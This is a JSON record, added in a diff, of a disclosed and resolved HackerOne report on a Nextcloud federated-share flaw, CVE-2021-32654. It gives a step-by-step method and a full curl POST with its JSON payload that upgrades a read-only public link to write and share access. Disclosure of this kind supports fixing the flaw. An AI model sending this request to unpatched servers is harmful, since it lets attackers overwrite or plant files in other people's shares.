@@ -1,0 +1,140 @@
+{
+  "id": 1170024,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTcwMDI0",
+  "url": "https://hackerone.com/reports/1170024",
+  "title": "Attacker can obtain write access to any federated share/public link",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-04-20T20:48:20.259Z",
+  "submitted_at": "2021-04-20T20:48:20.362Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rtod",
+    "url": "/rtod",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-32654"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-06-10T13:41:19.545Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-05-11T13:41:11.058Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi mates,\n\nI stumbled across this with public links. But the same holds true for any federated share. I will try to describe the link scenario.\nAt first I thought there were more steps (and resharing was involved). But it really is very simples:\n\n1. An attacker obtains a public link (again plenty of those around). For the sake of the attack it is a read only public link\n2. The attacker uses the 'add to my nextcloud' functionality to have a federated share created to their own instance\n3. The attacker accepts this share\n4. Now the attacker checks their database and finds the entry in the `oc_share_external` table.\n\nWe are looking for really only the remote id. And the token.\nFor the sake of this example the `remote id = 2` and the `token = nOxdNJkb1xbI1VX`\n\n5. Now we craft our request\n\n```\ncurl -v -X POST http://localhost/index.php/ocm/notifications -d '{\"notificationType\":\"RESHARE_CHANGE_PERMISSION\",\"resourceType\":\"file\",\"providerId\":2,\"notification\":{\"sharedSecret\":\"nOxdNJkb1xbI1VX\",\"permission\":[\"read\",\"write\",\"share\"]}}' -H 'Content-type: application/json'\n```\n\nTo break this down.\nWe send an (anonymous) POST request to the victims server to be precise to index.php/ocm/notifications\nAnd we pass it the following json\n\n```json\n{\n   \"notificationType\":\"RESHARE_CHANGE_PERMISSION\",\n   \"resourceType\":\"file\",\n   \"providerId\":2,\n   \"notification\":{\n      \"sharedSecret\":\"nOxdNJkb1xbI1VX\",\n      \"permission\":[\n         \"read\",\n         \"write\",\n         \"share\"\n      ]\n   }\n}\n```\n\n6. The attacker now enjoys their federated share with READ+WRITE+UPDATE+CREATE+SHARE access. (I think it is probably even a bug that there is no way to grant DELETE).\n\n\nSince we create a federated share at step 1. This also holds true for any created federated share.\n\n## Impact\n\nIn short if an attacker has a public link. Or a federated share with them they can elevate their permissions very easily.\n\nThis allows them to overwrite files. Add new files. And so on. In short the integrity of all files in public links and federated shares should be considered compromised.\n\nPardon my directness. But you really should take a serious look at your federation code. As it seems to miss checks all over the place. Maybe recommending everybody to disable it for now is the best course of action.",
+  "bounty_amount": "4000.0",
+  "formatted_bounty": "$4,000",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2021-06-10T13:41:11.125Z",
+  "allow_singular_disclosure_after": -155007213.4569214,
+  "singular_disclosure_allowed": true,
+  "vote_count": 142,
+  "voters": [
+    "mirchr",
+    "brunopaixao",
+    "aagat_sh",
+    "wi11",
+    "drsniper",
+    "jarij",
+    "todayisnew-",
+    "alp",
+    "0x3f",
+    "badcracker",
+    "and 132 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 13,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
